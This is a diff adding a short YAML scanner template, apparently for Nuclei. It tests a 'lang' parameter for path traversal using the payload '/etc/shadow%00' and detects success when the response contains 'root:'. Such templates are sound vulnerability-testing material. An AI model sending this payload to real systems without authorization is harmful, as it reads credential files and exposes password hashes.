@@ -1,0 +1,20 @@
+id: lfi3-208
+name: 'Traversal to system file via lang'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via lang'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      lang:
+        - '/etc/shadow%00'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:'
